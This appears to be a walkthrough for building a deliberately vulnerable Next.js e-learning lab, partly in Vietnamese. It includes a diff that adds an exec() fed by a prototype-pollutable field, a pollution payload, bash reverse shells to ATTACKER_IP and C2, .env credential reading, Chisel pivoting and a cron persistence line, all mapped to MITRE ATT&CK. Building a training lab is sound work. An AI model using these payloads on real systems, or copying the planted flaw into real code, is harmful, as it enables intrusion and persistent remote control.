# React2Shell Attack Chain — Implementation Walkthrough

**Date:** 2026-06-11  
**Objective:** Cài đặt chuỗi tấn công React2Shell (CVE-2025-55182) vào e-learning-ui lab

---

## Attack Flow Summary

```
┌──────────────────────────────────────────────────────────────────────┐
│ GĐ1: RECON                                                          │
│  → nmap + Wappalyzer → Next.js 16 + React 19 + Server Actions       │
├──────────────────────────────────────────────────────────────────────┤
│ GĐ2: INITIAL ACCESS                                                 │
│  → POST /register → tạo tài khoản STUDENT                           │
│  → POST /login → lấy session cookie                                 │
├──────────────────────────────────────────────────────────────────────┤
│ GĐ3: PRIVILEGE ESCALATION (STUDENT → LECTURER)                      │
│  → Burp: gọi updateUserProfile(myId, { role: "LECTURER" })          │
│  → Mass Assignment vuln (cho LECTURER, chặn ADMIN)                   │
│  → Re-login → session cập nhật role mới                              │
├──────────────────────────────────────────────────────────────────────┤
│ GĐ4: RCE via PROTOTYPE POLLUTION                                    │
│  → Burp: gọi createAssignment({                                     │
│      "__proto__": { "logCommand": "bash -c 'bash -i >& /dev/tcp/    │
│        ATTACKER_IP/4444 0>&1'" },                                    │
│      "title": "x", "dueDate": "2026-01-01"                          │
│    })                                                                │
│  → deepMerge() pollute Object.prototype.logCommand                   │
│  → exec(logCommand) → Reverse Shell                                  │
├──────────────────────────────────────────────────────────────────────┤
│ GĐ5: PIVOTING                                                       │
│  → cat .env → DB_INTERNAL_HOST=172.20.0.5, DB_USER, DB_PASS         │
│  → Chisel/SSH tunnel → psql vào PostgreSQL nội bộ                    │
├──────────────────────────────────────────────────────────────────────┤
│ GĐ6: PERSISTENCE                                                    │
│  → crontab: */5 * * * * bash -c 'bash -i >& /dev/tcp/C2/4444 0>&1' │
└──────────────────────────────────────────────────────────────────────┘
```

---

## Vulnerability Chain (3 links)

### Link 1: Mass Assignment → Privilege Escalation
**File:** [user.ts](file:///home/tcus/Desktop/RedT/Project/e-learning-ui/lib/actions/user.ts)

- `updateUserProfile(userId, updateData)` dùng `deepMerge()` để merge raw client data
- Không filter trường `role` → attacker gửi `{ role: "LECTURER" }` 
- Code chặn `ADMIN` nhưng cho phép `LECTURER`
- **Không cần sửa** — đã có sẵn từ session trước

### Link 2: Prototype Pollution
**File:** [unsafeMerge.ts](file:///home/tcus/Desktop/RedT/Project/e-learning-ui/lib/utils/unsafeMerge.ts)

- `deepMerge()` không filter `__proto__`, `constructor`, `prototype`
- Khi nhận `{ "__proto__": { "logCommand": "..." } }`, nó ghi đè `Object.prototype.logCommand`
- **Không cần sửa** — đã có sẵn từ session trước

### Link 3: RCE via Command Template Pollution ← **MỚI**
**File:** [assignment.ts](file:///home/tcus/Desktop/RedT/Project/e-learning-ui/lib/actions/assignment.ts)

```ts
// Đọc logCommand từ metadata (đã bị pollute qua __proto__)
const logCommand = (baseMetadata as any).logCommand
  || `echo "[$(date)] Assignment created: ${title}" >> /tmp/assignment_logs.txt`;

exec(logCommand, ...);  // ← RCE
```

---

## Changes Made

### 1. [assignment.ts](file:///home/tcus/Desktop/RedT/Project/e-learning-ui/lib/actions/assignment.ts) — **Full rewrite**

```diff
+ import { exec } from "child_process"
+ import { auth } from "@/auth"
+ import { deepMerge } from "@/lib/utils/unsafeMerge"

+ // Auth check: LECTURER or ADMIN only
+ const session = await auth();
+ if (userRole !== "LECTURER" && userRole !== "ADMIN") {
+   throw new Error("Forbidden");
+ }

+ // Prototype Pollution via deepMerge
+ const baseMetadata = { systemGenerated: true, dueTime };
+ deepMerge(baseMetadata, meta);

+ // RCE gadget: pollutable logCommand
+ const logCommand = (baseMetadata as any).logCommand || `echo "..."`;
+ exec(logCommand, ...);
```

Key design decisions:
- **LECTURER role gate** forces attacker to escalate first (more realistic multi-step chain)
- **`logCommand` template** instead of `NODE_OPTIONS` — works reliably on Node 24 ESM
- **PrismaPg adapter** pattern consistent with codebase

### 2. Build fixes — 5 pages with `connection()`

Next.js 16 requires `connection()` from `next/server` to force dynamic rendering for pages that query the DB:

| Page | File |
|---|---|
| Admin Dashboard | [page.tsx](file:///home/tcus/Desktop/RedT/Project/e-learning-ui/app/admin/dashboard/page.tsx) |
| Admin Users | [page.tsx](file:///home/tcus/Desktop/RedT/Project/e-learning-ui/app/admin/users/page.tsx) |
| Lecturer Dashboard | [page.tsx](file:///home/tcus/Desktop/RedT/Project/e-learning-ui/app/lecturer/dashboard/page.tsx) |
| Lecturer Assignments | [page.tsx](file:///home/tcus/Desktop/RedT/Project/e-learning-ui/app/lecturer/assignments/page.tsx) |
| Student Dashboard | [page.tsx](file:///home/tcus/Desktop/RedT/Project/e-learning-ui/app/student/dashboard/page.tsx) |
| Student Assignments | [page.tsx](file:///home/tcus/Desktop/RedT/Project/e-learning-ui/app/student/assignments/page.tsx) |

---

## Verification

### Build
```
✓ npm run build — PASS
✓ 61 pages generated (0 errors)
✓ All DB pages correctly marked as ƒ (Dynamic)
```

### Prototype Pollution Dry-Run
```
✓ deepMerge with __proto__.logCommand → resolves to attacker command
✓ ({}).logCommand === "id > /tmp/pwned" after pollution
```

---

## MITRE ATT&CK Mapping

| Step | Technique | Code Location |
|---|---|---|
| Register STUDENT | T1078 (Valid Accounts) | [register.ts](file:///home/tcus/Desktop/RedT/Project/e-learning-ui/lib/actions/register.ts) |
| Mass Assignment | T1098 (Account Manipulation) | [user.ts:42](file:///home/tcus/Desktop/RedT/Project/e-learning-ui/lib/actions/user.ts#L42) |
| Prototype Pollution | T1190 (Exploit Public-Facing App) | [unsafeMerge.ts:8](file:///home/tcus/Desktop/RedT/Project/e-learning-ui/lib/utils/unsafeMerge.ts#L8) |
| RCE | T1059 (Command Interpreter) | [assignment.ts:108-111](file:///home/tcus/Desktop/RedT/Project/e-learning-ui/lib/actions/assignment.ts#L108-L111) |
| Credential Harvest | T1552 (Unsecured Credentials) | `.env` file |
| Pivoting | T1090 (Proxy) | Lab infra (Chisel/SSH) |
| Persistence | T1053.003 (Cron) | Post-exploitation |
